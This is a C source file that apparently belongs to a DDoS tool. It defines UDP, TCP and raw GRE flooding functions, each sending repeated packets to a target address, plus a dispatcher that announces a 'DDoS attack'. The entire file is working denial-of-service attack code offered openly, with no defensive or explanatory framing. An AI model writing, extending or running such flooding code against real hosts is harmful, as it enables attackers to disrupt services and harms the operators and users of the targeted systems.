#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include "utils.h"

void udp_flood(const char *target, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target, &dest.sin_addr);
    
    char packet[1024];
    memset(packet, 0xFF, sizeof(packet));
    
    for (int i = 0; i < 1000; i++) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    close(sock);
}

void tcp_flood(const char *target, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target, &dest.sin_addr);
    
    for (int i = 0; i < 100; i++) {
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            char packet[1024] = {0};
            send(sock, packet, sizeof(packet), 0);
            close(sock);
            sock = socket(AF_INET, SOCK_STREAM, 0);
        }
    }
    close(sock);
}

void gre_attack(const char *target) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_GRE);
    struct iphdr ip = {0};
    ip.version = 4;
    ip.ihl = 5;
    ip.tot_len = htons(sizeof(struct iphdr));
    ip.protocol = IPPROTO_GRE;
    inet_pton(AF_INET, target, &ip.daddr);
    
    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, target, &dest.sin_addr);
    
    for (int i = 0; i < 100; i++) {
        sendto(sock, &ip, sizeof(ip), 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    close(sock);
}

void ddos_attack(const char *target, const char *type) {
    if (strcmp(type, "UDP") == 0) {
        udp_flood(target, 80);
    } else if (strcmp(type, "TCP") == 0) {
        tcp_flood(target, 80);
    } else if (strcmp(type, "GRE") == 0) {
        gre_attack(target);
    }
    printf("[+] DDoS %s attack on %s\n", type, target);
}
